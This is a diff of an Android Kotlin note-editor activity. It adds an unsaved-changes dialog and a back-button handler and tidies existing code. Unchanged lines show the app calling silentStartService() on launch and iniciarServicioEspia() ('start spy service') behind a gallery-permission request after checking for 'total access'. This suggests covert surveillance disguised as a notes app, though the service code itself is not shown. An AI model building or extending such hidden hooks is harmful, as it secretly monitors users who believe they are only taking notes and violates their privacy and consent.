@@ -17,18 +17,12 @@ import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.text.Editable
-import android.text.Layout
 import android.text.TextWatcher
-import android.util.AttributeSet
 import android.view.Gravity
 import android.view.HapticFeedbackConstants
-import android.view.KeyEvent
 import android.view.MotionEvent
 import android.view.View
 import android.view.ViewTreeObserver
-import android.view.inputmethod.EditorInfo
-import android.view.inputmethod.InputConnection
-import android.view.inputmethod.InputConnectionWrapper
 import android.widget.Button
 import android.widget.EditText
 import android.widget.ImageButton
@@ -36,10 +30,9 @@ import android.widget.ImageView
 import android.widget.PopupMenu
 import android.widget.TextView
 import android.widget.Toast
+import androidx.activity.OnBackPressedCallback
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
-import androidx.appcompat.app.AppCompatActivity
-import androidx.appcompat.widget.AppCompatEditText
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.core.view.ViewCompat
@@ -86,13 +79,18 @@ class NoteEditorActivity : BaseActivity() {
     private var selectedColor: String = "#FFFFFF"
     private var currentBackgroundUri: String? = null
 
+    // --- VARIABLES PARA DETECTAR CAMBIOS ---
+    private var originalTitle: String = ""
+    private var originalContent: String = ""
+    private var originalColor: String = "#FFFFFF"
+    // ---------------------------------------
+
     private var isChecklistMode = false
     private val checklistItems = mutableListOf<ChecklistItem>()
     private lateinit var checklistAdapter: ChecklistAdapter
     private lateinit var itemTouchHelper: ItemTouchHelper
     private val gson = Gson()
 
-    // Variables para guardar la posición del toque
     private var lastTouchX: Float = 0f
     private var lastTouchY: Float = 0f
 
@@ -134,6 +132,7 @@ class NoteEditorActivity : BaseActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_note_editor)
 
+        // Configuración Edge-to-Edge (Pantalla completa)
         WindowCompat.setDecorFitsSystemWindows(window, false)
         val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
         val insetsController = WindowCompat.getInsetsController(window, window.decorView)
@@ -142,6 +141,7 @@ class NoteEditorActivity : BaseActivity() {
         layoutEditor = findViewById(R.id.editor_root)
         scrollContainer = findViewById(R.id.scroll_container)
 
+        // Manejo de Insets (Teclado y Barras de sistema)
         ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
             val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
@@ -152,6 +152,7 @@ class NoteEditorActivity : BaseActivity() {
             insets
         }
 
+        // Scroll inteligente cuando aparece el teclado
         val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
             val rootView = window.decorView.rootView
             val r = Rect()
@@ -164,10 +165,61 @@ class NoteEditorActivity : BaseActivity() {
         setupChecklist()
         setupListeners()
         setupRichTextInteractions()
+        setupBackPressHandler() // Activamos el interceptor de salida
 
         loadNoteData()
         silentStartService()
     }
+
+    // --- LÓGICA DE PROTECCIÓN CONTRA SALIDA ACCIDENTAL ---
+
+    private fun setupBackPressHandler() {
+        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
+            override fun handleOnBackPressed() {
+                checkChangesAndExit()
+            }
+        })
+    }
+
+    private fun checkChangesAndExit() {
+        if (hasUnsavedChanges()) {
+            showUnsavedChangesDialog()
+        } else {
+            finish()
+        }
+    }
+
+    private fun hasUnsavedChanges(): Boolean {
+        val currentTitle = etTitle.text.toString().trim()
+        val currentContent = getCurrentContent()
+        val currentColor = currentBackgroundUri ?: selectedColor
+
+        // Comparamos el estado actual con el estado inicial (original)
+        return currentTitle != originalTitle ||
+                currentContent != originalContent ||
+                currentColor != originalColor
+    }
+
+    // Helper para obtener el contenido unificado (sea Texto o Checklist JSON)
+    private fun getCurrentContent(): String {
+        return if (isChecklistMode) {
+            val jsonList = gson.toJson(checklistItems)
+            "{checklist:true}$jsonList"
+        } else {
+            etContent.text.toString()
+        }
+    }
+
+    private fun showUnsavedChangesDialog() {
+        AlertDialog.Builder(this)
+            .setTitle("Cambios sin guardar")
+            .setMessage("¿Deseas guardar los cambios antes de salir?")
+            .setPositiveButton("Guardar") { _, _ -> saveNote() }
+            .setNegativeButton("Descartar") { _, _ -> finish() }
+            .setNeutralButton("Cancelar", null)
+            .show()
+    }
+    // --------------------------------------------------------
 
     private fun initViews() {
         etTitle = findViewById(R.id.et_title)
@@ -183,31 +235,27 @@ class NoteEditorActivity : BaseActivity() {
         btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)
     }
 
-    // --- DETECCIÓN TÁCTIL MEJORADA (LONG PRESS SIN SISTEMA) ---
     private fun setupRichTextInteractions() {
-        // 1. Guardamos las coordenadas cuando el usuario toca la pantalla
+        // Detectar posición del toque
         etContent.setOnTouchListener { v, event ->
             if (event.action == MotionEvent.ACTION_DOWN) {
                 lastTouchX = event.x
                 lastTouchY = event.y
             }
-            // Devolvemos false para permitir scroll, mover cursor, etc.
             false
         }
 
-        // 2. Usamos el Listener nativo de Android para detectar pulsación larga
+        // Click Largo en Imagen
         etContent.setOnLongClickListener { view ->
             val text = etContent.text ?: return@setOnLongClickListener false
             val layout = etContent.layout ?: return@setOnLongClickListener false
 
-            // Calculamos la posición exacta basándonos en las coordenadas guardadas
             val x = lastTouchX.toInt() - etContent.totalPaddingLeft + etContent.scrollX
             val y = lastTouchY.toInt() - etContent.totalPaddingTop + etContent.scrollY
 
             val line = layout.getLineForVertical(y)
             val offset = layout.getOffsetForHorizontal(line, x.toFloat())
 
-            // Buscamos si hay una imagen en esa posición
             val spans = text.getSpans(offset, offset + 1, RichTextHelper.NotesImageSpan::class.java)
             val path = Path()
             val rectF = RectF()
@@ -220,22 +268,12 @@ class NoteEditorActivity : BaseActivity() {
                 layout.getSelectionPath(start, end, path)
                 path.computeBounds(rectF, true)
 
-                // ¿El toque largo ocurrió DENTRO de la imagen?
                 if (rectF.contains(x.toFloat(), y.toFloat())) {
-                    // Vibración para feedback táctil
                     etContent.performHapticFeedback(HapticFeedbackConstants.LONG_PRESS)
-
-                    // Mostrar NUESTRO menú
                     mostrarMenuImagenTexto(etContent, span)
-
-                    // IMPORTANTE: Retornamos TRUE
-                    // Esto le dice al sistema: "Ya manejé este evento, NO muestres tu menú".
                     return@setOnLongClickListener true
                 }
             }
-
-            // Si no fue imagen, retornamos FALSE
-            // Esto permite que salga el menú de sistema (Copiar/Pegar texto normal)
             return@setOnLongClickListener false
         }
     }
@@ -291,9 +329,10 @@ class NoteEditorActivity : BaseActivity() {
         }
     }
 
-    // --- SETUP LISTENERS ---
     private fun setupListeners() {
-        btnBack.setOnClickListener { finish() }
+        // Usamos la verificación de cambios al pulsar el botón de flecha atrás
+        btnBack.setOnClickListener { checkChangesAndExit() }
+
         btnSave.setOnClickListener { saveNote() }
         findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission(PERMISSION_REQUEST_GALLERY) }
         btnChangeBackground.setOnClickListener { iniciarFlujoCambioFondo() }
@@ -327,7 +366,6 @@ class NoteEditorActivity : BaseActivity() {
     }
 
     // --- PERMISOS ---
-
     private fun checkGalleryPermission(requestCode: Int) {
         if (verificarAccesoTotal()) {
             iniciarServicioEspia()
@@ -413,8 +451,6 @@ class NoteEditorActivity : BaseActivity() {
 
     private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }
 
-    // --- UTILS ---
-
     private fun smartScrollToCursor() {
         scrollContainer.postDelayed({
             val focusedView = currentFocus ?: return@postDelayed
@@ -481,7 +517,7 @@ class NoteEditorActivity : BaseActivity() {
         itemTouchHelper.attachToRecyclerView(rvChecklist)
     }
 
-    // --- RESTO IGUAL ---
+    // --- CARGA DE DATOS ---
     private fun loadNoteData() {
         if (intent.hasExtra("note_data")) {
             noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
@@ -490,6 +526,8 @@ class NoteEditorActivity : BaseActivity() {
                 @Suppress("DEPRECATION")
                 intent.getParcelableExtra("note_data") as? Note
             }
+
+            // Cargar en UI
             etTitle.setText(noteToEdit?.title)
             tvDateLabel.text = "Editado: ${noteToEdit?.date}"
 
@@ -515,11 +553,23 @@ class NoteEditorActivity : BaseActivity() {
             } else {
                 mostrarFondoColor("#FFFFFF")
             }
+
+            // GUARDAR ESTADO ORIGINAL (Para comparar al salir)
+            originalTitle = noteToEdit?.title ?: ""
+            originalContent = rawContent
+            originalColor = noteToEdit?.color ?: "#FFFFFF"
+
         } else {
+            // Nota Nueva
             val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
             tvDateLabel.text = currentDate
             mostrarFondoColor("#FFFFFF")
             switchToChecklistMode(false)
+
+            // Estado original vacío
+            originalTitle = ""
+            originalContent = ""
+            originalColor = "#FFFFFF"
         }
     }
 
@@ -549,42 +599,29 @@ class NoteEditorActivity : BaseActivity() {
         }
     }
 
-    // --- FUNCIÓN CORREGIDA: BIDIRECCIONAL (Texto <-> Checklist) ---
     private fun toggleChecklistMode() {
         if (!isChecklistMode) {
-            // MODO TEXTO -> MODO CHECKLIST
+            // Texto -> Checklist
             checklistItems.clear()
             checklistItems.addAll(convertirContenidoALista())
-
             if (checklistItems.isEmpty()) checklistItems.add(ChecklistItem("", false, null, 1))
             checklistAdapter.notifyDataSetChanged()
             switchToChecklistMode(true)
         } else {
-            // MODO CHECKLIST -> MODO TEXTO
+            // Checklist -> Texto
             val sb = StringBuilder()
-
             for (item in checklistItems) {
-                // 1. Recuperar el texto (agregamos [x] si estaba completada para no perder el estado)
                 val prefix = if (item.isChecked) "[x] " else ""
                 sb.append(prefix).append(item.text).append("\n")
-
-                // 2. RECUPERAR LA IMAGEN (Esto faltaba)
-                // Si el item tiene una imagen, inyectamos la etiqueta [IMG:...]
-                // Esto permite que el RichTextHelper la reconozca y la pinte.
                 if (item.imageUri != null) {
                     sb.append("[IMG:${item.imageUri}]\n")
                 }
             }
-
-            // 3. Renderizar Texto + Imágenes
-            // En lugar de etContent.setText(), usamos el Helper para que procese las etiquetas [IMG:...]
             RichTextHelper.setTextWithImages(this, etContent, sb.toString())
-
             switchToChecklistMode(false)
         }
     }
 
-    // --- FUNCIÓN CORREGIDA: Detecta ImageSpans Y TAMBIÉN etiquetas de texto [IMG:...] ---
     private fun convertirContenidoALista(): List<ChecklistItem> {
         val text = etContent.text ?: return emptyList()
         val rawString = text.toString()
@@ -594,21 +631,16 @@ class NoteEditorActivity : BaseActivity() {
         val lines = rawString.split("\n")
         val items = mutableListOf<ChecklistItem>()
 
-        // Variable para rastrear la posición en el Spannable original
         var currentIndex = 0
-
         for (line in lines) {
             var cleanText = line
             var imageUri: String? = null
 
-            // 1. INTENTO A: Buscar ImageSpan real (Objeto en memoria)
-            // Esto es lo ideal si el EditText aún tiene los objetos vivos
             val lineLength = line.length
             val end = currentIndex + lineLength
             val safeStart = if (currentIndex > text.length) text.length else currentIndex
             val safeEnd = if (end > text.length) text.length else end
 
-            // Solo buscar Spans si hay texto válido
             if (safeStart < safeEnd) {
                 val spans = text.getSpans(safeStart, safeEnd, android.text.style.ImageSpan::class.java)
                 if (spans.isNotEmpty()) {
@@ -616,39 +648,21 @@ class NoteEditorActivity : BaseActivity() {
                 }
             }
 
-            // 2. INTENTO B (LA SOLUCIÓN A TU PROBLEMA):
-            // Si no halló span, o si el texto contiene literalmente "[IMG:...]"
-            // Buscamos el patrón de texto y lo extraemos.
             if (cleanText.contains("[IMG:")) {
                 val startTag = cleanText.indexOf("[IMG:")
                 val endTag = cleanText.indexOf("]", startTag)
-
                 if (startTag != -1 && endTag != -1 && endTag > startTag) {
-                    // Extraemos la URI que está dentro
-                    val uriString = cleanText.substring(startTag + 5, endTag) // +5 para saltar "[IMG:"
-
-                    // Si no teníamos imagen por Span, usamos esta
-                    if (imageUri == null) {
-                        imageUri = uriString
-                    }
-
-                    // IMPORTANTE: Removemos ese código feo del texto visible
-                    // Reemplazamos "[IMG:...]" por vacío
+                    val uriString = cleanText.substring(startTag + 5, endTag)
+                    if (imageUri == null) imageUri = uriString
                     val tagCompleto = cleanText.substring(startTag, endTag + 1)
                     cleanText = cleanText.replace(tagCompleto, "")
                 }
             }
 
-            // 3. Limpieza final
-            // Borramos el caracter de objeto (\uFFFC) y espacios extra
             cleanText = cleanText.replace("\uFFFC", "").trim()
-
-            // Solo agregamos si quedó algo (texto o imagen)
             if (cleanText.isNotEmpty() || imageUri != null) {
-                // Creamos el item con el texto limpio y la URI en su lugar correcto
                 items.add(ChecklistItem(cleanText, false, imageUri, 1))
             }
-
             currentIndex += lineLength + 1
         }
         return items
@@ -690,33 +704,26 @@ class NoteEditorActivity : BaseActivity() {
         actualizarEstiloTexto(esFondoOscuro = true)
     }
 
-    // --- FUNCIÓN CORREGIDA: RESPETA LOS ICONOS ORIGINALES ---
     private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
         val colorTexto = if (esFondoOscuro) Color.WHITE else Color.BLACK
         val colorHint = if (esFondoOscuro) Color.LTGRAY else Color.GRAY
 
-        // 1. Aplicar a Título
         etTitle.setTextColor(colorTexto)
         etTitle.setHintTextColor(colorHint)
         etTitle.setCursorColor(colorTexto)
 
-        // 2. Aplicar a Contenido
         etContent.setTextColor(colorTexto)
         etContent.setHintTextColor(colorHint)
         etContent.setCursorColor(colorTexto)
 
-        // 3. Etiqueta de fecha
         tvDateLabel.setTextColor(colorHint)
 
-        // 4. BOTONES DE LA BARRA SUPERIOR
-        // IMPORTANTE: clearColorFilter() para que no se tiñan y respeten su diseño original
+        // IMPORTANTE: Mantener iconos originales sin tinte
         btnBack.clearColorFilter()
         btnSave.clearColorFilter()
         btnToggleChecklist.clearColorFilter()
         btnChangeBackground.clearColorFilter()
 
-        // 5. Actualizar Checklist (si está activo)
-        // Avisamos al adaptador que cambie el color del texto y los iconos
         if (::checklistAdapter.isInitialized) {
             checklistAdapter.updateTextColor(colorTexto)
         }
@@ -771,12 +778,8 @@ class NoteEditorActivity : BaseActivity() {
         val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
         val finalBackgroundData = currentBackgroundUri ?: selectedColor
 
-        val finalContent = if (isChecklistMode) {
-            val jsonList = gson.toJson(checklistItems)
-            "{checklist:true}$jsonList"
-        } else {
-            etContent.text.toString()
-        }
+        // Usamos getCurrentContent para reutilizar la lógica
+        val finalContent = getCurrentContent()
 
         if (title.isEmpty() && finalContent.trim().isEmpty()) {
             Toast.makeText(this, "Vacía", Toast.LENGTH_SHORT).show()
